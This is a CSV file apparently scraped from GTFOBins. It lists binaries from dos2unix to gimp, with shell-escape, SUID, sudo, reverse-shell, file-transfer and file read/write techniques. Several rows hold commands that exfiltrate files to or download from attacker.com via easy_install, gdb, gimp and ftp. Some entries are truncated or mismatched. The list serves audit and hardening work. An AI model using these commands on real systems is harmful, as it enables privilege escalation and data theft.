dos2unix,File write,https://gtfobins.github.io/gtfobins/dos2unix/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE1=file_to_read
LFILE2=file_to_write
dos2unix -f -n ""$LFILE1"" ""$LFILE2"""
dosbox,File write,https://gtfobins.github.io/gtfobins/dosbox/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",FILE_TO_
dosbox,File read,https://gtfobins.github.io/gtfobins/dosbox/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE='\path\to\file_to_read'
dosbox -c 'mount c /' -c ""type c:$LFILE"""
dosbox,SUID,https://gtfobins.github.io/gtfobins/dosbox/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
dosbox,Sudo,https://gtfobins.github.io/gtfobins/dosbox/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dotnet,Shell,https://gtfobins.github.io/gtfobins/dotnet/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"dotnet fsi
System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;"
dotnet,File read,https://gtfobins.github.io/gtfobins/dotnet/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","export LFILE=file_to_read
dotnet fsi
System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;"
dotnet,Sudo,https://gtfobins.github.io/gtfobins/dotnet/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dpkg,Shell,https://gtfobins.github.io/gtfobins/dpkg/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
dpkg,Sudo,https://gtfobins.github.io/gtfobins/dpkg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dstat,Shell,https://gtfobins.github.io/gtfobins/dstat/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"mkdir -p ~/.dstat
echo 'import os; os.execv(""/bin/sh"", [""sh""])' >~/.dstat/dstat_xxx.py
dstat --xxx"
dstat,Sudo,https://gtfobins.github.io/gtfobins/dstat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dvips,Shell,https://gtfobins.github.io/gtfobins/dvips/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
dvips -R0 texput.dvi"
dvips,Sudo,https://gtfobins.github.io/gtfobins/dvips/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dvips,Limited SUID,https://gtfobins.github.io/gtfobins/dvips/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
easy_install,Shell,https://gtfobins.github.io/gtfobins/easy_install/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
easy_install $TF"
easy_install,Reverse shell,https://gtfobins.github.io/gtfobins/easy_install/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
easy_install,File upload,https://gtfobins.github.io/gtfobins/easy_install/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
easy_install $TF"
easy_install,File download,https://gtfobins.github.io/gtfobins/easy_install/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \""\""\""import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\""\""\"")"" > $TF/setup.py
pip install $TF"
easy_install,File write,https://gtfobins.github.io/gtfobins/easy_install/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""import os;
os.execl('$(whereis python)', 'python', '-c', 'open(\""$LFILE\"",\""w+\"").write(\""DATA\"")')"" > $TF/setup.py
easy_install $TF"
easy_install,File read,https://gtfobins.github.io/gtfobins/easy_install/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp -d)
echo 'print(open(""file_to_read"").read())' > $TF/setup.py
easy_install $TF"
easy_install,Library load,https://gtfobins.github.io/gtfobins/easy_install/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"TF=$(mktemp -d)
echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
easy_install $TF"
easy_install,Sudo,https://gtfobins.github.io/gtfobins/easy_install/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
eb,Shell,https://gtfobins.github.io/gtfobins/eb/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"eb logs
!/bin/sh"
eb,Sudo,https://gtfobins.github.io/gtfobins/eb/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ed,Shell,https://gtfobins.github.io/gtfobins/ed/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ed
!/bin/sh"
ed,File write,https://gtfobins.github.io/gtfobins/ed/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","ed file_to_write
a
DATA
.
w
q"
ed,File read,https://gtfobins.github.io/gtfobins/ed/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","ed file_to_read
,p
q"
ed,SUID,https://gtfobins.github.io/gtfobins/ed/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ed,Sudo,https://gtfobins.github.io/gtfobins/ed/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ed,Limited SUID,https://gtfobins.github.io/gtfobins/ed/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
efax,SUID,https://gtfobins.github.io/gtfobins/efax/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
efax,Sudo,https://gtfobins.github.io/gtfobins/efax/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
elvish,Shell,https://gtfobins.github.io/gtfobins/elvish/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,elvish
elvish,File write,https://gtfobins.github.io/gtfobins/elvish/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
elvish -c 'echo DATA >$E:LFILE'"
elvish,File read,https://gtfobins.github.io/gtfobins/elvish/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","export LFILE=file_to_read
elvish -c 'echo (slurp <$E:LFILE)'"
elvish,SUID,https://gtfobins.github.io/gtfobins/elvish/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
elvish,Sudo,https://gtfobins.github.io/gtfobins/elvish/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
emacs,Shell,https://gtfobins.github.io/gtfobins/emacs/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"emacs -Q -nw --eval '(term ""/bin/sh"")'"
emacs,File write,https://gtfobins.github.io/gtfobins/emacs/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","emacs file_to_write
DATA
C-x C-s"
emacs,File read,https://gtfobins.github.io/gtfobins/emacs/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",emacs file_to_read
emacs,SUID,https://gtfobins.github.io/gtfobins/emacs/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
emacs,Sudo,https://gtfobins.github.io/gtfobins/emacs/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
enscript,Shell,https://gtfobins.github.io/gtfobins/enscript/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
enscript,Sudo,https://gtfobins.github.io/gtfobins/enscript/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
env,Shell,https://gtfobins.github.io/gtfobins/env/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,env /bin/sh
env,SUID,https://gtfobins.github.io/gtfobins/env/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
env,Sudo,https://gtfobins.github.io/gtfobins/env/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
eqn,File read,https://gtfobins.github.io/gtfobins/eqn/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
eqn ""$LFILE"""
eqn,SUID,https://gtfobins.github.io/gtfobins/eqn/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
eqn,Sudo,https://gtfobins.github.io/gtfobins/eqn/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
espeak,File read,https://gtfobins.github.io/gtfobins/espeak/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
espeak -qXf ""$LFILE"""
espeak,SUID,https://gtfobins.github.io/gtfobins/espeak/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
espeak,Sudo,https://gtfobins.github.io/gtfobins/espeak/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ex,Shell,https://gtfobins.github.io/gtfobins/ex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ex
!/bin/sh"
ex,File write,https://gtfobins.github.io/gtfobins/ex/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","ex file_to_write
a
DATA
.
w
q"
ex,File read,https://gtfobins.github.io/gtfobins/ex/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","ex file_to_read
,p
q"
ex,Sudo,https://gtfobins.github.io/gtfobins/ex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
exiftool,File write,https://gtfobins.github.io/gtfobins/exiftool/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
INPUT=input_file
exiftool -filename=$LFILE $INPUT"
exiftool,File read,https://gtfobins.github.io/gtfobins/exiftool/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
OUTPUT=output_file
exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT"
exiftool,Sudo,https://gtfobins.github.io/gtfobins/exiftool/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
expand,File read,https://gtfobins.github.io/gtfobins/expand/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
expand ""$LFILE"""
expand,SUID,https://gtfobins.github.io/gtfobins/expand/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
expand,Sudo,https://gtfobins.github.io/gtfobins/expand/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
expect,Shell,https://gtfobins.github.io/gtfobins/expect/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,expect -c 'spawn /bin/sh;interact'
expect,File read,https://gtfobins.github.io/gtfobins/expect/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",expect
expect,SUID,https://gtfobins.github.io/gtfobins/expect/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
expect,Sudo,https://gtfobins.github.io/gtfobins/expect/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
facter,Shell,https://gtfobins.github.io/gtfobins/facter/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
echo 'exec(""/bin/sh"")' > $TF/x.rb
FACTERLIB=$TF facter"
facter,Sudo,https://gtfobins.github.io/gtfobins/facter/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
file,File read,https://gtfobins.github.io/gtfobins/file/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",file
file,SUID,https://gtfobins.github.io/gtfobins/file/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
file,Sudo,https://gtfobins.github.io/gtfobins/file/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
find,Shell,https://gtfobins.github.io/gtfobins/find/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,find . -exec /bin/sh \; -quit
find,File write,https://gtfobins.github.io/gtfobins/find/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
find / -fprintf ""$FILE"" DATA -quit"
find,SUID,https://gtfobins.github.io/gtfobins/find/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
find,Sudo,https://gtfobins.github.io/gtfobins/find/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
finger,File upload,https://gtfobins.github.io/gtfobins/finger/#file-upload,It can exfiltrate files on the network.,"sudo nc -l -p 79 | base64 -d > ""file_to_save"""
finger,File download,https://gtfobins.github.io/gtfobins/finger/#file-download,It can download remote files.,"base64 ""file_to_send"" | sudo nc -l -p 79"
fish,Shell,https://gtfobins.github.io/gtfobins/fish/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,fish
fish,SUID,https://gtfobins.github.io/gtfobins/fish/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
fish,Sudo,https://gtfobins.github.io/gtfobins/fish/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
flock,Shell,https://gtfobins.github.io/gtfobins/flock/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,flock -u / /bin/sh
flock,SUID,https://gtfobins.github.io/gtfobins/flock/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
flock,Sudo,https://gtfobins.github.io/gtfobins/flock/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
fmt,File read,https://gtfobins.github.io/gtfobins/fmt/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",fmt
fmt,SUID,https://gtfobins.github.io/gtfobins/fmt/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
fmt,Sudo,https://gtfobins.github.io/gtfobins/fmt/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
fold,File read,https://gtfobins.github.io/gtfobins/fold/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
fold -w99999999 ""$LFILE"""
fold,SUID,https://gtfobins.github.io/gtfobins/fold/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
fold,Sudo,https://gtfobins.github.io/gtfobins/fold/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
fping,File read,https://gtfobins.github.io/gtfobins/fping/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
fping -f $LFILE"
fping,Sudo,https://gtfobins.github.io/gtfobins/fping/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ftp,Shell,https://gtfobins.github.io/gtfobins/ftp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ftp
!/bin/sh"
ftp,File upload,https://gtfobins.github.io/gtfobins/ftp/#file-upload,It can exfiltrate files on the network.,"RHOST=attacker.com
ftp $RHOST
put file_to_send"
ftp,File download,https://gtfobins.github.io/gtfobins/ftp/#file-download,It can download remote files.,"RHOST=attacker.com
ftp $RHOST
get file_to_get"
ftp,Sudo,https://gtfobins.github.io/gtfobins/ftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gawk,Shell,https://gtfobins.github.io/gtfobins/gawk/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"gawk 'BEGIN {system(""/bin/sh"")}'"
gawk,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/gawk/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
gawk,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/gawk/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
gawk,File write,https://gtfobins.github.io/gtfobins/gawk/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
gawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
gawk,File read,https://gtfobins.github.io/gtfobins/gawk/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
gawk '//' ""$LFILE"""
gawk,SUID,https://gtfobins.github.io/gtfobins/gawk/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gawk,Sudo,https://gtfobins.github.io/gtfobins/gawk/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gawk,Limited SUID,https://gtfobins.github.io/gtfobins/gawk/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
gcc,Shell,https://gtfobins.github.io/gtfobins/gcc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"gcc -wrapper /bin/sh,-s ."
gcc,File write,https://gtfobins.github.io/gtfobins/gcc/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_delete
gcc -xc /dev/null -o $LFILE"
gcc,File read,https://gtfobins.github.io/gtfobins/gcc/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
gcc -x c -E ""$LFILE"""
gcc,Sudo,https://gtfobins.github.io/gtfobins/gcc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gcloud,Shell,https://gtfobins.github.io/gtfobins/gcloud/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
gcloud,Sudo,https://gtfobins.github.io/gtfobins/gcloud/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gcore,File read,https://gtfobins.github.io/gtfobins/gcore/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",gcore $PID
gcore,SUID,https://gtfobins.github.io/gtfobins/gcore/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gcore,Sudo,https://gtfobins.github.io/gtfobins/gcore/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gdb,Shell,https://gtfobins.github.io/gtfobins/gdb/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,gdb -nx -ex '!sh' -ex quit
gdb,Reverse shell,https://gtfobins.github.io/gtfobins/gdb/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
gdb,File upload,https://gtfobins.github.io/gtfobins/gdb/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit"
gdb,File download,https://gtfobins.github.io/gtfobins/gdb/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit"
gdb,File write,https://gtfobins.github.io/gtfobins/gdb/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit"
gdb,File read,https://gtfobins.github.io/gtfobins/gdb/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit"
gdb,Library load,https://gtfobins.github.io/gtfobins/gdb/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit"
gdb,SUID,https://gtfobins.github.io/gtfobins/gdb/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gdb,Sudo,https://gtfobins.github.io/gtfobins/gdb/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gdb,Capabilities,https://gtfobins.github.io/gtfobins/gdb/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
gem,Shell,https://gtfobins.github.io/gtfobins/gem/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,rdoc
gem,Sudo,https://gtfobins.github.io/gtfobins/gem/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
genie,Shell,https://gtfobins.github.io/gtfobins/genie/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,genie -c '/bin/sh'
genie,SUID,https://gtfobins.github.io/gtfobins/genie/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
genie,Sudo,https://gtfobins.github.io/gtfobins/genie/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
genisoimage,File read,https://gtfobins.github.io/gtfobins/genisoimage/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
genisoimage -q -o - ""$LFILE"""
genisoimage,SUID,https://gtfobins.github.io/gtfobins/genisoimage/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
genisoimage,Sudo,https://gtfobins.github.io/gtfobins/genisoimage/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ghc,Shell,https://gtfobins.github.io/gtfobins/ghc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ghc -e 'System.Process.callCommand ""/bin/sh""'"
ghc,Sudo,https://gtfobins.github.io/gtfobins/ghc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ghci,Shell,https://gtfobins.github.io/gtfobins/ghci/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ghci
System.Process.callCommand ""/bin/sh"""
ghci,Sudo,https://gtfobins.github.io/gtfobins/ghci/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gimp,Shell,https://gtfobins.github.io/gtfobins/gimp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'"
gimp,Reverse shell,https://gtfobins.github.io/gtfobins/gimp/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
gimp,File upload,https://gtfobins.github.io/gtfobins/gimp/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com/
export LFILE=file_to_send
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'"
gimp,File download,https://gtfobins.github.io/gtfobins/gimp/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'"
